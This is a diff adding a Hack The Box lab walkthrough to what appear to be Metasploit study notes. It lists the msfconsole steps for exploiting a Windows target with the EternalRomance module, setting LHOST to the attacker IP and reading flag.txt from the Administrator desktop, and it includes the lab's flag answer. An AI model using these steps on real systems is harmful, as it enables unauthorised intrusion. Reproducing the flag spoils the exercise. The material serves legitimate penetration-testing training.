@@ -497,3 +497,18 @@ nt authority\system
 ```
 
 This has been a quick and dirty example of how `msfconsole` can help out quickly but serves as an excellent example of how the framework works. Only one module was needed without any `payload` selection, `encoding` or `pivoting` between sessions or jobs.
+
+Use the Metasploit-Framework to exploit the target with EternalRomance. Find the flag.txt file on Administrator's desktop and submit the contents as the answer.
+
+`HTB{MSF-W1nD0w5-3xPL01t4t10n}`
+* retrieve ip from HTB
+* open msfconsole
+* type `search eternalromance`
+* type `use 0` to choose the exploit option
+* type `options`
+* set RHOSTS with HTB ip
+* set LHOST with attacker ip (tun0 ip used when using openvpn)
+* type `run` command
+* on powershell, type `cd ../..` to get to C: folder
+* type `cd Users/Administrator/Desktop`
+* type `cat flag.txt`
